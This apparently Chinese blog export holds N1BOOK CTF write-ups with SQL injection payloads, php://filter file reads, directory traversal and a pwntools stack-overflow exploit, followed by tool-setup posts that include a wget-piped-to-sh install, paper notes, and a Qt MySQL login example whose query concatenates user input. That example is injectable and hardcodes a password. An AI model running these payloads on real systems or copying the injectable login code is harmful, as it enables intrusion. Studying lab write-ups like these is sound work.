<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><h3 id="先验知识：常见的敏感文件"><a href="#先验知识：常见的敏感文件" class="headerlink" title="先验知识：常见的敏感文件"></a>先验知识：常见的敏感文件</h3><ol>
<li>gedit备份文件，格式为<code>filename~</code>，比如<code>index.php~</code>  </li>
<li>vim备份文件，格式为<code>.filename.swp</code>或者<code>*.swo</code>或者<code>*.swn</code>，比如<code>.index.php.swp</code>  </li>
<li>robots.txt  </li>
<li>还有<code>filename.bak</code>文件</li>
</ol>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol>
<li><p>地址后加<code>/index.php~</code>    </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109223222659-122979701.png" alt="img"></p>
</li>
<li><p><code>/.index.php.swp</code>会即刻下载备份文件，可通过<code>vi index.php</code>建一个只有空格的文件，然后通过<code>vim -r index.php</code>进行恢复即可得到<br> <img src="/2020/11/11/N1BOOK/1931211-20201109225055125-364536216.png" alt="img"></p>
</li>
<li><p><code>/robots.txt</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201109224118439-1125637828.png" alt="img"><br> 查看这个文本文件  </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109224223273-908316035.png" alt="img"></p>
<p>综上可得  </p>
</li>
</ol>
<blockquote>
<p>n1book{info_1s_v3ry_imp0rtant_hack}</p>
</blockquote>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露 </p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201109172615955-1966111900.png" alt="img"></p>
<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
<li>借助<a href="https://github.com/WangYihang/GitHacker">GitHacker工具</a>  </li>
<li><code>git clone https://github.com/WangYihang/GitHacker.git</code>  </li>
<li><code>cd GitHacker</code>  </li>
<li><code>python Githacker.py http://0fcbe3ec-471a-452a-9e5f-953c5026eb18.node3.buuoj.cn/.git</code><br><img src="/2020/11/11/N1BOOK/1931211-20201109222425300-439745981.png" alt="img">  </li>
<li>进入恢复后的文件夹<code>cd 0fcbe3ec-471a-452a-9e5f-953c5026eb18_node3_buuoj_cn_</code>，有个index.html<br><img src="/2020/11/11/N1BOOK/1931211-20201109222705671-1100399964.png" alt="img">  </li>
<li>浏览器打开index.html即可拿到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201109222803648-1320351443.png" alt="img"><blockquote>
<p>n1book{git_looks_s0_easyfun}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><ol>
<li>打开题目链接可以看到<br><img src="/2020/11/11/N1BOOK/1931211-20201111105652234-783984521.png" alt="img"></li>
<li>试试<code>id=1+1</code>的回显，发现和<code>id=1</code>结果相同，所以不是数字型注入，可能是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110017446-1664980143.png" alt="img"></li>
<li>尝试<code>id=1a</code>发现和<code>id=1</code>结果相同，所以确实是字符型<br><img src="/2020/11/11/N1BOOK/1931211-20201111110249600-1227706058.png" alt="img"></li>
<li>尝试用<code>id=1&#39;#</code>，单引号用于闭合前面的单引号，井号用于注释后面预置的单引号。这里<font face="楷体" color="red">注意：#一定要用URL编码，即%23</font>，所以实际上需要输入<code>id=1&#39;%23</code>单引号会被自动转成%27<br><img src="/2020/11/11/N1BOOK/1931211-20201111111203589-1163518685.png" alt="img"></li>
<li>可以成功显示  </li>
<li>优先尝试UNION注入<code>id=-1&#39;union select 1,2,3%23</code>，其中-1是为了使第一行记录无法被查询到，当然，除了-1也可以是一个很大的值比如1024、100等。后面的查询语句是尝试测试哪些字段可以回显<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">参考</a><br><img src="/2020/11/11/N1BOOK/1931211-20201111112032432-1319004183.png" alt="img"></li>
<li>所以将数字2改成我们想查询的内容：所有表名<code>group_concat(table_name)</code>，<code>group_concat</code>是用<code>,</code>联合多行记录的函数。所以为查询本数据库的其他所有表名，需<code>id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code>，随即看到fl4g<br><img src="/2020/11/11/N1BOOK/1931211-20201111112630199-158278303.png" alt="img"></li>
<li>查询fl4g中的字段名，<code>id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;fl4g&#39;%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113011837-1925798496.png" alt="img"></li>
<li>获取fllllag的内容，<code>id=-1&#39;union select 1,fllllag,3 from fl4g%23</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111113143857-1970053562.png" alt="img"><blockquote>
<p>n1book{union_select_is_so_cool}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h2><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>有的网站会开启错误调试信息方便开发者调试，可以利用报错信息进行<strong>报错注入</strong>  </li>
<li>updatexml第二个参数应为合法XPATH路径，否则会在引发报错的同时输出传入的参数  </li>
<li>dual用于测试数据库是否可以正常使用  </li>
</ol>
<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><ol>
<li><p>在连接后加上<code>/login.php</code>，右键查看源码<br> <img src="/2020/11/11/N1BOOK/1931211-20201114180246608-43938250.png" alt="img"></p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201114175943865-1170585348.png" alt="img">  </p>
</li>
<li><p>回到登录页面，打开Burp Suite，安装方法<a href="https://www.pianshen.com/article/8533363563/#20_Burp_Suite__57">参考</a>  </p>
</li>
<li><p>推荐浏览器插件：SwitchyOmega，可以省去每次设置代理的步骤，使用BurpSuite时，点击插件选择对应Burp Suite的代理即可<br> <img src="/2020/11/11/N1BOOK/1931211-20201122233423320-7334493.png" alt="img">  </p>
</li>
<li><p>在login界面随便输入用户名和密码如1,1然后点击登录  </p>
</li>
<li><p>可以在Burp Suite中Proxy-&gt;HTTP history看到记录<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234140730-1675769603.png" alt="img">  </p>
</li>
<li><p>CTRL+R，发送到Repeater，在login.php后添加<code>?tips=1</code>，点击Go，看到报错<br> <img src="/2020/11/11/N1BOOK/1931211-20201122234308612-2127113186.png" alt="img">  </p>
</li>
<li><p>用dual进行测试<code>name=1&#39;and updatexml(1,concat(0x7e,(select 1 from dual)),1)#&amp;pass=xxxx</code><br> <img src="/2020/11/11/N1BOOK/1931211-20201122235414244-1226071747.png" alt="img">  </p>
</li>
<li><p>说明存在过滤，将select改成selEct重新发送后回显正常<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235551248-284421726.png" alt="img">  </p>
</li>
<li><p>之后的操作与与SQL注入1同理，将selEct后的1改为group_concat(table_name)，dual改为information_schema.tables where table_schema=database()以查看所有表名<br> <img src="/2020/11/11/N1BOOK/1931211-20201122235936482-283322537.png" alt="img">  </p>
</li>
<li><p>仍与SQL注入1同理，查看fl4g的字段，分别改为group_concat(column_name)和information_schema.columns where table_name=’fl4g’<br><img src="/2020/11/11/N1BOOK/1931211-20201123000206027-1673938152.png" alt="img">  </p>
</li>
<li><p>获取flag，<code>selEct flag from fl4g</code><br><img src="/2020/11/11/N1BOOK/1931211-20201123000312454-163132210.png" alt="img">  </p>
<blockquote>
<p>n1book{login_sqli_is_nice}</p>
</blockquote>
</li>
</ol>
<h2 id="第一章-web入门-afr-1"><a href="#第一章-web入门-afr-1" class="headerlink" title="[第一章 web入门]afr_1"></a>[第一章 web入门]afr_1</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><ol>
<li>PHP向用户提供的指定待打开文件的方式，是一个文件流  </li>
<li>PHP的Filter机制，可对目前的协议进行一定的处理，比如将当前文件流的内容进行Base64编码。使用方法<code>php://filter/read=convert.base64-encode/resource=xxx</code>  </li>
<li>利用Filter机制，构造形如以上的攻击数据可以读取文件，拿到各种文件的源码  </li>
</ol>
<h3 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115180608275-1525964878.png" alt="img">  </li>
<li><code>p=php://filter/read=convert.base64-encode/resource=hello</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181019047-1546308797.png" alt="img">  <blockquote>
<p>PD9waHAKCmVjaG8gImhlbGxvIHdvcmxkISI7</p>
</blockquote>
</li>
</ol>
<p><a href="https://tool.oschina.net/encrypt?type=3">Base64解码</a>结果为  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure>
<ol>
<li>尝试改p，发现<code>p=flag</code>时有回显，所以应该存在这么个文件<br><img src="/2020/11/11/N1BOOK/1931211-20201115180652404-1677628879.png" alt="img">  </li>
<li><p><code>p=php://filter/read=convert.base64-encode/resource=flag</code><br><img src="/2020/11/11/N1BOOK/1931211-20201115181356049-426897552.png" alt="img">  </p>
<blockquote>
<p>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</p>
</blockquote>
</li>
<li><p>解码结果为  </p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p>Nginx错误配置可能产生目录穿越漏洞，比如：  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">location /<span class="keyword">static</span> &#123;</span><br><span class="line">    alias /home/myapp/<span class="keyword">static</span>/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于static后没有加/，如果用户请求/static../，拼接到alias进会变成/home/myapp/static/../会穿越到myapp目录  </p>
<h3 id="方法-4"><a href="#方法-4" class="headerlink" title="方法"></a>方法</h3><ol>
<li>点击题目链接<br><img src="/2020/11/11/N1BOOK/1931211-20201115235618945-1220381986.png" alt="img"> </li>
<li>右键查看源码<br><img src="/2020/11/11/N1BOOK/1931211-20201115235644275-1101729838.png" alt="img">  </li>
<li>查看img目录<br><img src="/2020/11/11/N1BOOK/1931211-20201115235800682-1951172374.png" alt="img">  </li>
<li>目录穿越<br><img src="/2020/11/11/N1BOOK/1931211-20201115235824630-1004736249.png" alt="img">  </li>
<li>下载flag，用记事本打开即可  <blockquote>
<p>n1book{afr_2_solved}</p>
</blockquote>
</li>
</ol>
<h2 id="第五章-CTF之RE章-Hello-RE"><a href="#第五章-CTF之RE章-Hello-RE" class="headerlink" title="[第五章 CTF之RE章]Hello, RE"></a>[第五章 CTF之RE章]Hello, RE</h2><p>直接拖到ida64反编译即可看到flag<br><img src="/2020/11/11/N1BOOK/1931211-20201111115333510-1380860265.png" alt="img">  </p>
<blockquote>
<p>n1book{Welcome_to_reversing_world!}  </p>
</blockquote>
<h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><p>题目提供了libc-2.27.so和stack，根据经验知道这题环境是Ubuntu18，需要进行堆栈平衡  </p>
<ol>
<li><code>checksec stack</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111204026170-317361439.png" alt="img">  </li>
<li>IDA64反编译，并查看<code>main</code>函数  </li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>进一步查看<code>vuln</code>，发现栈溢出漏洞<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204429141-497488314.png" alt="img">  </p>
</li>
<li><p>双击变量<code>v1</code>查看栈信息，所以当覆盖<code>&#39;a&#39;*18</code>后即可到达函数返回地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204527280-1969476305.png" alt="img">  </p>
</li>
<li><p>同时注意到IDA64的函数窗口有个<code>shell</code>，查看以下发现<br> <img src="/2020/11/11/N1BOOK/1931211-20201111204818419-1089495331.png" alt="img"> </p>
</li>
<li><p>所以需要将<code>shell</code>的地址0x覆盖到<code>vuln</code>的返回地址即可。由于前面提到需要堆栈平衡，我们还要知道shell的ret地址<br> <img src="/2020/11/11/N1BOOK/1931211-20201111205501285-1592593146.png" alt="img"></p>
<p><img src="/2020/11/11/N1BOOK/1931211-20201111205403033-1732093910.png" alt="img">  </p>
</li>
<li><p>综上，有exp如下  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./stack&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25413</span>)</span><br><span class="line">shell = <span class="number">0x400537</span></span><br><span class="line">retn = <span class="number">0x40054e</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">18</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure>
<ol>
<li><code>python exp.py</code><br><img src="/2020/11/11/N1BOOK/1931211-20201111205701121-1124011515.png" alt="img">  <blockquote>
<p>n1book{851939e4e90b864b8d20fe6228564522}</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>N1BOOK</tag>
      </tags>
  </entry>
  <entry>
    <title>Nessus安装</title>
    <url>/2021/01/20/Nessus%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://blog.csdn.net/nex1less/article/details/88407590">参考</a>  </p>
<ol>
<li>从<a href="http://www.tenable.com/products/nessus/select-your-operating-system">官网</a>下载对应版本的Nessus，这里下载的是Nessus-8.13.1-debian6_amd64.deb  </li>
<li><code>dpkg -i Nessus-8.13.1-debian6_amd64.deb</code>  </li>
<li>安装完成后提示<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/000Nessus_install_finished.png" alt>  </li>
<li>故通过<code>/bin/systemctl start nessusd.service</code>启动  </li>
<li>查看Nessus启动状态（下图为启动成功）<code>netstat -ntpl | grep nessus</code><br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/002netstat.png" alt>  </li>
</ol>
<h2 id="注册与初始化"><a href="#注册与初始化" class="headerlink" title="注册与初始化"></a>注册与初始化</h2><ol>
<li><a href="http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code">http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code</a>  </li>
<li>这里注册免费的Nessus Essential  </li>
<li>获取邮箱收到的激活码  </li>
<li>启动页通过浏览器查看<a href="https://kali:8834/">https://kali:8834/</a><br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/001Nessus_browser_ui.png" alt>  </li>
<li>选择注册版本，并填写激活码<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/003license.png" alt>  </li>
<li>这里遇到了一个问题，网络断开，重启网络<code>systemctl restart networking</code>不管用。<code>ifconfig</code>发现ip地址只有127.0.0.1，于是<code>sudo dhclient eth0</code>，随即恢复 <a href="https://unix.stackexchange.com/questions/178399/no-longer-able-to-reach-the-internet-on-kali-linux">参考</a>  </li>
<li>随后要求注册账号，填写用户名和密码，即可开始初始化过程<br><img src="/2021/01/20/Nessus%E5%AE%89%E8%A3%85/004initialing.png" alt>  </li>
<li>在线下载很慢，于是<a href="https://blog.csdn.net/robacco/article/details/89575849">离线下载</a>  </li>
</ol>
<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p><a href="https://blog.csdn.net/Fish_cyy/article/details/105797084">参考</a>  </p>
<h2 id="切换root用户"><a href="#切换root用户" class="headerlink" title="切换root用户"></a>切换root用户</h2><p><code>sudo passwd root</code>给root添加密码即可</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN分析环境搭建</title>
    <url>/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p><a href="http://mirrors.163.com/ubuntu-releases/16.04/">http://mirrors.163.com/ubuntu-releases/16.04/</a> 这里下载 ubuntu-16.04.7-desktop-amd64.iso </p>
<ul>
<li>注意先建空白盘</li>
</ul>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154505963.png" alt="image-20210531154505963"></p>
<ul>
<li><p>建好后再通过设置，添加 ISO 映像文件</p>
<p><img src="/2021/05/31/PWN%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210531154636268.png" alt="image-20210531154636268"></p>
</li>
<li><p>然后再启动虚拟机开始安装</p>
</li>
</ul>
<h2 id="二进制安全研究工具"><a href="#二进制安全研究工具" class="headerlink" title="二进制安全研究工具"></a>二进制安全研究工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt install libc6:i386</span><br><span class="line"></span><br><span class="line">sudo apt install gcc-4.8 cmake gdb socat vim</span><br><span class="line">sudo apt install python-dev python-pip python3 python3-dev python3-pip</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里我是分步用 sudo python -m pip install 安装的</span></span><br><span class="line">sudo pip install zio pwntools ropgadget capstone keystone-engine unicorn</span><br><span class="line">wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span><br><span class="line">sudo wget https://github.com/slimm609/checksec.sh/raw/master/checksec -O /usr/local/bin/checksec &amp;&amp; sudo chmod +x /usr/local/bin/checksec</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>论文研读 2021-05-19</title>
    <url>/2021/05/19/QianPaper/</url>
    <content><![CDATA[<h1 id="程序运行模型"><a href="#程序运行模型" class="headerlink" title="程序运行模型"></a>程序运行模型</h1><h2 id="函数运行模型"><a href="#函数运行模型" class="headerlink" title="函数运行模型"></a>函数运行模型</h2><ul>
<li>将程序分解为每一个函数的状态的组合</li>
<li>函数内部运行一个独立的<strong>自动机</strong></li>
<li>每一个函数的自动机组合在一起形成整个程序的自动机</li>
</ul>
<h3 id="自动机构建"><a href="#自动机构建" class="headerlink" title="自动机构建"></a>自动机构建</h3><ul>
<li>静态生成：链表存放函数状态转移</li>
<li>动态生成：函数运行的过程中动态生成自动机。可以减少特征值存放所需要的空间，但是遇到某些未加入状态的正常函数会产生误报。</li>
</ul>
<h2 id="动态完整性度量方法"><a href="#动态完整性度量方法" class="headerlink" title="动态完整性度量方法"></a>动态完整性度量方法</h2><ul>
<li>程序进入新函数时，度量模块就会将函数调用者对应的调用序列压栈保存，并新建空间保存当前序列</li>
<li>函数运行过程中，度量模块记录程序这段时间的调用，作为度量内容</li>
<li>函数运行结束后，度量模块已经记录函数运行序列，并将其与函数自动机比对，验证度量是否成功</li>
<li>度量符合则继续运行，不符合则结束运行</li>
<li>程序返回上一个函数，并将原先保存的序列出栈，继续以上过程，直到程序结束</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Qian 的这篇文章，其实本质上和我们提的方法是一样的。但是这种形式化的描述方法，算法的描述都非常值得借鉴学习！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Lee 发来的一篇不知篇名的文章（未检索到相关信息）</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt 连接 MySQL</title>
    <url>/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="1-Qt-连接本地-MySQL-的方法-（Win）"><a href="#1-Qt-连接本地-MySQL-的方法-（Win）" class="headerlink" title="1 Qt 连接本地 MySQL 的方法 （Win）"></a>1 Qt 连接本地 MySQL 的方法 （Win）</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><h4 id="1-1-1-MySQL-安装"><a href="#1-1-1-MySQL-安装" class="headerlink" title="1.1.1 MySQL 安装"></a>1.1.1 MySQL 安装</h4><p><a href>MySQL的安装</a></p>
<h4 id="1-1-2-新建试验用的数据库和表"><a href="#1-1-2-新建试验用的数据库和表" class="headerlink" title="1.1.2 新建试验用的数据库和表"></a>1.1.2 新建试验用的数据库和表</h4><p>根据需要，自行新建数据库并添加数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database neuralinfo;</span><br><span class="line">use neuralinfo;</span><br><span class="line">create table users(user_name char(50), user_passwd char(50), primary key(user_name))engine=InnoDB;</span><br><span class="line">insert into users values(&#x27;info&#x27;,&#x27;123456&#x27;);</span><br></pre></td></tr></table></figure>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104152754.png" alt="image-20210527104152754"></p>
<h4 id="1-1-3-ODBC-安装"><a href="#1-1-3-ODBC-安装" class="headerlink" title="1.1.3 ODBC 安装"></a>1.1.3 ODBC 安装</h4><p><a href="https://blog.csdn.net/joey_ro/article/details/105411135">ODBC安装 参考</a></p>
<ul>
<li><a href="https://dev.mysql.com/downloads/connector/odbc/">官网下载</a> 根据指示安装即可</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103810926.png" alt="image-20210527103810926"></p>
<ul>
<li><p>打开 ODBC 64</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527103907632.png" alt="image-20210527103907632"></p>
</li>
<li><p>添加用户 DSN，根据实际情况填写即可</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104308974.png" alt="image-20210527104308974"></p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104415956.png" alt="image-20210527104415956"></p>
</li>
</ul>
<h3 id="1-2-Qt-连接数据库"><a href="#1-2-Qt-连接数据库" class="headerlink" title="1.2 Qt 连接数据库"></a>1.2 Qt 连接数据库</h3><p>这里，我们写了一个登录页面来试验 MySQL 的连接</p>
<h4 id="1-2-1-UI"><a href="#1-2-1-UI" class="headerlink" title="1.2.1 UI"></a>1.2.1 UI</h4><ul>
<li>主窗口如图，输入框均为 LineEdit</li>
</ul>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527104746481.png" alt="image-20210527104746481"></p>
<ul>
<li><p>用户名和口令正确，点击 Login 会进入子窗口，子窗口为空白窗口</p>
<p><img src="/2021/05/27/Qt%E8%BF%9E%E6%8E%A5MySQL/image-20210527105011886.png" alt="image-20210527105011886"></p>
</li>
</ul>
<h4 id="1-2-2-源码逻辑"><a href="#1-2-2-源码逻辑" class="headerlink" title="1.2.2 源码逻辑"></a>1.2.2 源码逻辑</h4><p><a href="https://github.com/woopokyuk/qtLogin">https://github.com/woopokyuk/qtLogin</a></p>
<p>pro 文件中需要 <code>QT+=sql</code></p>
<ul>
<li><p>必要头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlQuery&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>连接与语句执行方法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; QSqlDatabase::<span class="built_in">drivers</span>();</span><br><span class="line">ui-&gt;passwdLineEdit-&gt;<span class="built_in">setEchoMode</span>(QLineEdit::Password);</span><br><span class="line">QSqlDatabase db = QSqlDatabase::<span class="built_in">addDatabase</span>(<span class="string">&quot;QODBC&quot;</span>);</span><br><span class="line">db.<span class="built_in">setHostName</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPort</span>(<span class="number">3306</span>);</span><br><span class="line">db.<span class="built_in">setDatabaseName</span>(<span class="string">&quot;Neural&quot;</span>);  <span class="comment">// ODBC 中数据源的名称，不是 MySQL 中数据库的名称</span></span><br><span class="line">db.<span class="built_in">setUserName</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">db.<span class="built_in">setPassword</span>(<span class="string">&quot;0000&quot;</span>);  <span class="comment">// 数据库登录密码</span></span><br><span class="line">db.<span class="built_in">open</span>();</span><br><span class="line"><span class="keyword">if</span> (!db.<span class="built_in">open</span>()) &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;db not open&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">QString passwd = ui-&gt;passwdLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line">QString sqlLine = <span class="string">&quot;SELECT * FROM users WHERE user_passwd=&quot;</span> + passwd;</span><br><span class="line">QSqlQuery result = db.<span class="built_in">exec</span>(sqlLine);  <span class="comment">// 执行 MySQL 语句</span></span><br><span class="line">QString userNameInSql = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (result.<span class="built_in">next</span>()) &#123;</span><br><span class="line">    userNameInSql = result.<span class="built_in">value</span>(<span class="string">&quot;user_name&quot;</span>).<span class="built_in">toString</span>();</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; userNameInSql;</span><br><span class="line">&#125;</span><br><span class="line">QString inputUserName = ui-&gt;userLineEdit-&gt;<span class="built_in">text</span>();</span><br><span class="line"><span class="keyword">if</span>(userNameInSql == inputUserName &amp;&amp; inputUserName != <span class="string">&quot;&quot;</span>) &#123;  <span class="comment">// 验证用户名口令是否一致</span></span><br><span class="line">    test-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;User name or Password is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="2-Linux-Qt-连接远程-MySQL（Win）"><a href="#2-Linux-Qt-连接远程-MySQL（Win）" class="headerlink" title="2 Linux Qt 连接远程 MySQL（Win）"></a>2 Linux Qt 连接远程 MySQL（Win）</h2><hr>
<h3 id="2-1-Linux-下载安装-ODBC"><a href="#2-1-Linux-下载安装-ODBC" class="headerlink" title="2.1 Linux 下载安装 ODBC"></a>2.1 Linux 下载安装 ODBC</h3><h4 id="2-1-1-安装-unixODBC-和-ODBC"><a href="#2-1-1-安装-unixODBC-和-ODBC" class="headerlink" title="2.1.1 安装 unixODBC 和 ODBC"></a>2.1.1 安装 unixODBC 和 ODBC</h4><p>主要参考 <a href="https://blog.csdn.net/seakingx/article/details/87879164">https://blog.csdn.net/seakingx/article/details/87879164</a></p>
<ul>
<li><p>进行到 <code>sudo myodbc-installer -a -d -n &quot;MySQL ODBC 8.0 Driver&quot; -t &quot;Driver=/usr/local/lib/libmyodbc8w.so</code> 时，报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">myodbc-installer: error while loading shared libraries: libodbc.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原因：未按步骤安装 unixODBC，按以上参考顺序安装即可，若遇权限问题 sudo 无法解决 (如安装 unixODBC 过程中需要 make 但有权限问题 sudo 无法解决)，就 su 转 root 用户再执行指令</p>
<ul>
<li><p><strong>正确步骤：</strong></p>
